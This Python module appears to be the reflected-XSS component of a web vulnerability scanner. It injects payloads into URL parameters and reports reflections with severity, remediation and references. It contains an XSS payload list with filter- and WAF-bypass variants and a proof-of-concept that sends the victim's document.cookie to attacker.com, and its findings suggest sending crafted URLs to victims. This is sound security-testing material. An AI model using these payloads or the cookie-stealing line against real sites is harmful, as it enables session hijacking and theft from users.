"""
XSS Scanner — Reflected XSS detection
Passive: send payload, check for reflection in the response
"""

import asyncio
import re
from urllib.parse import urlparse, parse_qs, urlencode, urlunparse
from rich.console import Console
from core.models import Vulnerability, Severity

console = Console()

# WAF bypass + encoding variants
XSS_PAYLOADS = [
    # Basic
    '<script>alert(1)</script>',
    '"><script>alert(1)</script>',
    "'><script>alert(1)</script>",
    # HTML5 event handlers
    '<img src=x onerror=alert(1)>',
    '<svg onload=alert(1)>',
    '<body onload=alert(1)>',
    '<input autofocus onfocus=alert(1)>',
    # Filter bypass — case
    '<ScRiPt>alert(1)</sCrIpT>',
    # Filter bypass — encoding
    '<script>alert\u00281\u0029</script>',
    '&#x3C;script&#x3E;alert(1)&#x3C;/script&#x3E;',
    # Filter bypass — comments
    '<scr<!---->ipt>alert(1)</scr<!---->ipt>',
    '<!--><script>alert(1)</script>',
    # WAF bypass — template literals
    '<script>alert`1`</script>',
    # Polyglot
    'jaVasCript:/*-/*`/*\\`/*\'/*"/**/(/* */oNcliCk=alert(1))//%0D%0A%0d%0a//</stYle/</titLe/</teXtarEa/</scRipt/--!>\\x3csVg/<sVg/oNloAd=alert(1)//>>>',
    # Double encoding
    '%253Cscript%253Ealert(1)%253C%252Fscript%253E',
    # Null byte
    '<scri\x00pt>alert(1)</scri\x00pt>',
    # Attribute context
    '" autofocus onfocus="alert(1)',
    "' autofocus onfocus='alert(1)",
]

# Unique marker to check reflection
MARKER = "xsstest7731"
MARKER_PAYLOADS = [
    f'<{MARKER}>',
    f'"{MARKER}"',
    f"'{MARKER}'",
]

# BUG FIX 1: you can't use a backslash inside an f-string (Python 3.11),
# so the XSS PoC payload is kept in a separate variable.
XSS_POC_PAYLOAD = '<script>document.location="https://attacker.com/steal?c="+document.cookie</script>'


class XSSScanner:
    def __init__(self, http_client):
        self.http_client = http_client

    def _extract_params(self, url: str) -> list[tuple]:
        """Extract parameters from the URL"""
        parsed = urlparse(url)
        params = parse_qs(parsed.query, keep_blank_values=True)
        return list(params.keys())

    def _inject_payload(self, url: str, param: str, payload: str) -> str:
        """Inject payload into the URL"""
        parsed = urlparse(url)
        params = parse_qs(parsed.query, keep_blank_values=True)
        params[param] = [payload]
        new_query = urlencode(params, doseq=True)
        return urlunparse(parsed._replace(query=new_query))

    def _check_reflection(self, payload: str, response_text: str) -> bool:
        """Is the payload reflected in the response?"""
        # Reflection without HTML encoding
        if payload.lower() in response_text.lower():
            return True
        # Partial reflection (between tags)
        if MARKER in response_text:
            return True
        return False

    def _is_executable(self, payload: str, response_text: str) -> bool:
        """Is the payload in an execution context?"""
        dangerous_patterns = [
            r'<script[^>]*>' + re.escape(MARKER),
            re.escape(payload),
            r'onerror\s*=\s*["\']?' + re.escape(MARKER),
        ]
        for pattern in dangerous_patterns:
            if re.search(pattern, response_text, re.IGNORECASE):
                return True
        return False

    async def _test_param(self, url: str, param: str) -> list[Vulnerability]:
        vulns = []

        for payload in XSS_PAYLOADS[:8]:  # First 8 payloads — quick test
            test_url = self._inject_payload(url, param, payload)
            response = await self.http_client.get(test_url)

            if not response:
                continue

            content_type = response.headers.get("content-type", "")
            if "text/html" not in content_type.lower():
                continue

            if self._check_reflection(payload, response.text):
                is_exec = self._is_executable(payload, response.text)
                cvss = 7.2 if is_exec else 5.4

                # BUG FIX 1: uses the XSS_POC_PAYLOAD variable,
                # no direct backslash-quote inside the f-string.
                poc_url = self._inject_payload(url, param, XSS_POC_PAYLOAD)

                vuln = Vulnerability(
                    vuln_type="XSS",
                    url=test_url,
                    severity=Severity.HIGH if is_exec else Severity.MEDIUM,
                    cvss_score=cvss,
                    title=f"Reflected XSS — {param} parameter",
                    description=(
                        f"The user input in the '{param}' parameter is reflected in the "
                        f"response without HTML encoding. This allows an XSS attack."
                    ),
                    evidence=f"Payload '{payload}' found in response",
                    exploitation=(
                        f"Send this URL to the victim:\n"
                        f"{test_url}\n\n"
                        f"More effective payload:\n"
                        f"{poc_url}"
                    ),
                    remediation=(
                        "1. HTML encode user input (htmlspecialchars in PHP)\n"
                        "2. Add a Content-Security-Policy header\n"
                        "3. Apply encoding based on the output context"
                    ),
                    parameter=param,
                    method="GET",
                    payload_used=payload,
                    curl_poc=f'curl -s "{test_url}"',
                    cwe_id="CWE-79",
                    references=[
                        "https://owasp.org/www-community/attacks/xss/",
                        "https://portswigger.net/web-security/cross-site-scripting",
                    ],
                )
                vulns.append(vuln)
                break  # Stop for this param once one vuln is found

        return vulns

    async def scan(self, url: str, extra_params: list[str] = None) -> list[Vulnerability]:
        """Scan the URL for XSS"""
        params = self._extract_params(url)
        if extra_params:
            params.extend(extra_params)

        if not params:
            return []

        console.print(f"  [dim]XSS scan: {len(params)} parameters — {url[:60]}[/dim]")

        tasks = [self._test_param(url, param) for param in params]
        results = await asyncio.gather(*tasks, return_exceptions=True)

        vulns = []
        for r in results:
            if isinstance(r, list):
                vulns.extend(r)

        for v in vulns:
            console.print(f"  {v.severity.emoji} [bold red]XSS found:[/bold red] {v.parameter} @ {url[:50]}")

        return vulns